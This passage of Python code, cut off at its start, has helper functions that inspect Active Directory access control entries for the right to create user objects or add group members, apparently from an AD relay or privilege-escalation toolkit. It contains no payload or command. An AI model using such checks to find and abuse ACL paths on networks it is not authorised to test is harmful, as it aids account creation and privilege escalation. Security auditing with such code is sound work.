    createprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CREATE_CHILD)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
        return False
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf967aba-0de6-11d0-a285-00aa003049e2'
    return createprivs and userprivs

# Check if an ACE allows for adding members
def can_add_member(ace):
    writeprivs = ace['Ace']['Mask'].hasPriv(ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP)
    if ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE or ace['Ace']['ObjectType'] == b'':
        return writeprivs
    userprivs = bin_to_string(ace['Ace']['ObjectType']).lower() == 'bf9679c0-0de6-11d0-a285-00aa003049e2'
    return writeprivs and userprivs
